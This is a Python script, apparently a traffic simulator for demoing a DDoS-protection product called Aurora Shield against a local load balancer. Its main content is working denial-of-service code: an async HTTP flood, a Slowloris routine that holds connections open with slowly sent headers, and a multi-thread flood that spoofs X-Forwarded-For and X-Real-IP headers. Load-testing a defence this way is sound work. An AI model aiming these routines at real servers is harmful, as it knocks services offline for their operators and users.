#!/usr/bin/env python3
"""
Client simulator for Aurora Shield Demo (renamed from attack_simulator.py)
Sends various HTTP request patterns for demo/testing.
"""

import asyncio
import aiohttp
import requests
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor

class ClientSimulator:
    def __init__(self):
        # Target the load balancer instead of Aurora Shield directly
        self.target_host = os.getenv('TARGET_HOST', 'load-balancer')
        self.target_port = os.getenv('TARGET_PORT', '8090')
        self.base_url = f"http://{self.target_host}:{self.target_port}"
        
    def simulate_normal_traffic(self, duration=60):
        """Simulate normal user traffic"""
        print(f"🌐 Starting normal traffic simulation for {duration} seconds...")
        
        endpoints = ['/', '/health']
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration:
            try:
                endpoint = random.choice(endpoints)
                headers = {'User-Agent': random.choice(user_agents)}
                
                response = requests.get(f"{self.base_url}{endpoint}", 
                                      headers=headers, timeout=5)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"   Normal traffic: {request_count} requests sent")
                
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"   Normal traffic error: {e}")
                time.sleep(1)
        
        print(f"✅ Normal traffic completed: {request_count} requests")
    
    async def simulate_http_flood(self, duration=30, rate=50):
        """Simulate HTTP flood pattern"""
        print(f"🚨 Starting HTTP Flood pattern for {duration} seconds at {rate} req/s...")
        
        async with aiohttp.ClientSession() as session:
            start_time = time.time()
            request_count = 0
            
            while time.time() - start_time < duration:
                tasks = []
                
                for _ in range(rate):
                    task = self.http_flood_request(session)
                    tasks.append(task)
                
                await asyncio.gather(*tasks, return_exceptions=True)
                request_count += rate
                
                if request_count % 100 == 0:
                    print(f"   HTTP Flood: {request_count} requests sent")
                
                await asyncio.sleep(1)
        
        print(f"✅ HTTP Flood completed: {request_count} requests")
    
    async def http_flood_request(self, session):
        """Single HTTP flood request"""
        try:
            async with session.get(f"{self.base_url}/", 
                                 timeout=aiohttp.ClientTimeout(total=2)) as response:
                await response.text()
        except:
            pass
    
    def simulate_slowloris(self, duration=30, connections=20):
        """Simulate Slowloris-like connection behavior"""
        print(f"🐌 Starting Slowloris pattern for {duration} seconds with {connections} connections...")
        
        def slowloris_connection():
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_host, int(self.target_port)))
                
                # Send partial HTTP request
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(b"Host: " + self.target_host.encode() + b"\r\n")
                sock.send(b"User-Agent: SlowLoris\r\n")
                
                # Keep connection alive by sending headers slowly
                start_time = time.time()
                header_count = 0
                
                while time.time() - start_time < duration:
                    sock.send(f"X-Custom-Header-{header_count}: {time.time()}\r\n".encode())
                    header_count += 1
                    time.sleep(random.uniform(10, 15))
                
                sock.close()
                
            except Exception as e:
                print(f"   Slowloris connection error: {e}")
        
        # Start multiple slow connections
        with ThreadPoolExecutor(max_workers=connections) as executor:
            futures = [executor.submit(slowloris_connection) for _ in range(connections)]
            
            # Wait for completion
            for future in futures:
                try:
                    future.result(timeout=duration + 10)
                except:
                    pass
        
        print(f"✅ Slowloris pattern completed")
    
    def simulate_distributed(self, duration=30, bot_count=30):
        """Simulate distributed requests from multiple clients"""
        print(f"🌐 Starting Distributed pattern for {duration} seconds with {bot_count} clients...")
        
        def client_thread(bot_id):
            headers = {
                'X-Forwarded-For': f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
                'User-Agent': f"Client-{bot_id}"
            }
            
            start_time = time.time()
            bot_requests = 0
            
            while time.time() - start_time < duration:
                try:
                    response = requests.get(f"{self.base_url}/", 
                                          headers=headers, timeout=3)
                    bot_requests += 1
                    time.sleep(random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    time.sleep(1)
            
            print(f"   Client {bot_id}: {bot_requests} requests")
        
        # Launch distributed clients
        with ThreadPoolExecutor(max_workers=bot_count) as executor:
            futures = [executor.submit(client_thread, i) for i in range(bot_count)]
            
            for future in futures:
                try:
                    future.result(timeout=duration + 10)
                except:
                    pass
        
        print(f"✅ Distributed pattern completed")
    
    async def run_demo_scenario(self):
        """Run a complete demo scenario"""
        print("🎭 Starting Aurora Shield Demo Scenario")
        print("=" * 60)
        
        # Phase 1: Normal Traffic
        print("\n📊 Phase 1: Normal Traffic Baseline")
        self.simulate_normal_traffic(duration=30)
        
        await asyncio.sleep(10)
        
        # Phase 2: HTTP Flood Pattern
        print("\n⚡ Phase 2: HTTP Flood Pattern")
        await self.simulate_http_flood(duration=45, rate=100)
        
        await asyncio.sleep(15)
        
        # Phase 3: Distributed Pattern
        print("\n🌐 Phase 3: Distributed Pattern")
        self.simulate_distributed(duration=60, bot_count=50)
        
        await asyncio.sleep(10)
        
        # Phase 4: Slowloris Pattern
        print("\n🐌 Phase 4: Slowloris Pattern")
        self.simulate_slowloris(duration=45, connections=25)
        
        await asyncio.sleep(15)
        
        # Phase 5: Return to Normal
        print("\n✅ Phase 5: Return to Normal Traffic")
        self.simulate_normal_traffic(duration=60)
        
        print("\n🎉 Demo scenario completed!")
        print("Check the Aurora Shield dashboard at http://localhost:8080")

if __name__ == "__main__":
    simulator = ClientSimulator()
    
    # Wait for Aurora Shield to be ready
    print("⏳ Waiting for Aurora Shield to be ready...")
    for attempt in range(30):
        try:
            response = requests.get(f"{simulator.base_url}/health", timeout=5)
            if response.status_code == 200:
                print("✅ Aurora Shield is ready!")
                break
        except:
            pass
        
        time.sleep(10)
        print(f"   Attempt {attempt + 1}/30...")
    else:
        print("❌ Could not connect to Aurora Shield")
        exit(1)
    
    # Run the demo
    asyncio.run(simulator.run_demo_scenario())
